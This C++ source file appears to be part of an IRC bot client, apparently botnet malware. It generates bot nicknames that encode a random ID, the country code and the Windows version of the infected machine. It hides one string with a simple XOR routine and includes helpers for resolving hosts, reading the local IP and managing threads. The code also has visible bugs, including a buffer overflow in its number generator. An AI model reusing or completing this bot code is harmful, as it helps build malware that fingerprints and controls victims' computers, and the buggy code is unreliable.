//mod this file later
#include "includes.h"
#include "externs.h"
int GenerateOnce = 0;
char *IDSaver;
using namespace std;

char *meglan(string toBeEncrypted, string sKey)
{
    string sEncrypted(toBeEncrypted);
    unsigned int iKey(sKey.length()), iIn(toBeEncrypted.length()), x(0);

    for(unsigned int i = 0; i < iIn; i++){
        sEncrypted[i] = toBeEncrypted[i] ^ sKey[x] & 10;
        if(++x == iKey){ x = 0; }
    }
    size_t size = sEncrypted.size() + 1;
    char * buffer = new char[size];
    strncpy( buffer, sEncrypted.c_str(), size );
    cout << buffer << '\n';
    return buffer;
}

char *GenerateNumber(int Len)
{
	char *nick;
	int i;
	nick = (char *) malloc (Len);
	nick[0] = '\0';
	srand(GetTickCount());
	for (i = 0; i < Len; i++) {
		sprintf(nick, "%s%d", nick, rand()%10);
	}
	nick[i] = '\0';
	return nick;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

char *GenerateNickA(void)//Making nick
{
	
	static char nick[MAX_NICKLEN];
	ZeroMemory(nick,MAX_NICKLEN);
	char locale[MAX_NICKLEN];
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));

		strcat_s(nick,"[");
		strcat_s(nick,GenerateID());//Getting ID
		strcat_s(nick,"|");
		strcat_s(nick,locale); //Getting Country letters
	strcat_s(nick,"|");
	strcat_s(nick,GenerateOS());//Getting OS
	strcat_s(nick,"|");
	strcat_s(nick,meglan("R;Z8p","8"));//Getting OS
	strcat_s(nick,"]");	
	return nick;
}

char *GenerateID(void)
{    
    char *ID; 
	if (GenerateOnce != 1) 
    {
	for (int i=0;i < 4; i++)
	ID = GenerateNumber(4);
	IDSaver = ID;
	GenerateOnce = 1;
    }
	else
    {
    ID = IDSaver;
	}
	return ID;
}

char *GenerateOS(void)
{	
	char *os;

	OSVERSIONINFO osVI;
	osVI.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	if (GetVersionEx(&osVI)) {
			if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==0)
			{	if(osVI.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)		os="95";
				if(osVI.dwPlatformId==VER_PLATFORM_WIN32_NT)			os="NT"; }
			else if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==10)	os="98";
			else if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==90)	os="ME";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==0)	os="2K";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==1)	os="XP";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==2)	os="2K3";
			else if(osVI.dwMajorVersion==6 && osVI.dwMinorVersion==0)	os="VIS";
			else if(osVI.dwMajorVersion==6 && osVI.dwMinorVersion==1)	os="WIN7";
			else														os="UNK";
		} else
			os="UNK";
	
	return os;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

unsigned int Resolve(char *host) 
{
    struct	hostent		*hp;
    unsigned int		host_ip;

    host_ip = inet_addr(host);
    if (host_ip == INADDR_NONE) 
	{
        hp = gethostbyname(host);
        if (hp == 0) 
            return 0;
		else 
			host_ip = *(u_int *)(hp->h_addr);
    }

    return host_ip;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

char *GetMyIP(SOCKET sock) 
{
	static char		ip[16];
	SOCKADDR		sa;
	int				sas = sizeof(sa);

	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(ip, "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);

	return (ip);
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

void Thread_Prepare()
{
	int		i;
	
	for (i = 0; i < MAX_THREADS; i++)
	{
		threads[i].tHandle = NULL;
		threads[i].type = NONE;
	}
}

int Thread_Add(thread_type type)
{
	int		i;

	for (i = 0; i < MAX_THREADS; i++)
		if (threads[i].tHandle == NULL)
			break;

	if (i == MAX_THREADS)
		i = -1;
	else
		threads[i].type = type;
		
	return i;
}

int Thread_Check(thread_type type)
{
	int		i, 
			k = 0;

	for (i = 0; i < MAX_THREADS; i++)
		if (threads[i].type == type)
			k++;

	return k;
}

void Thread_Clear(int num)
{
	threads[num].tHandle = NULL;
	threads[num].type = NONE;
	closesocket(threads[num].tsock);
}

int Thread_Kill(thread_type type)
{
	int		i,
			k = 0;

	for (i = 0; i < MAX_THREADS; i++)
	{
		if (threads[i].type == type)
		{
			TerminateThread(threads[i].tHandle, 0);
			Thread_Clear(i);
			k++;
		}
	}

	return k;
}

HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param, BOOL wait)
{
	DWORD		id = 0;
	HANDLE		tHandle;

	tHandle = CreateThread(NULL, 0, function, (LPVOID)param, 0, &id);

	if (wait)
	{
		WaitForSingleObject(tHandle, INFINITE);
		CloseHandle(tHandle);
	}
	else
		Sleep(THREAD_WAIT_TIME);

	return tHandle;
}



